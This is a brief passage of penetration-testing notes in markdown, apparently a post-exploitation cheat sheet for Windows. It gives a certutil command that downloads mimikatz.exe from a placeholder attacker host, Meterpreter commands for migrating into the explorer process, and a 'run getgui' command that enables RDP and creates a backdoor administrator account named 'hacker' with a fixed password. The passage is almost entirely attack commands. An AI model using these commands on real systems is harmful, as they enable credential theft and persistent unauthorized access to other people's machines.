- __`certutil - urlcache -f http://<attacker>/mimikatz.exe mimikatz.exe`__
  - __Windows utilities can be used to download files from a remote web server, Same as wget in linux__
 
- __`pgrep explorer`__
  - __`migrate <process_id>`__
 
  # Windows Persistence via RDP
 
- __Down below is a meterpreter command used to enable the RDP service if it is disable and create a new user__
- __This `hacker` user is added in `Remote Desktop Users` and `Administrators` group__
  - __`run getgui -e -u hacker -p hacker@123321`__
  - > __Note: You require elevated privileges in order to establish persistence on a Windows system.__
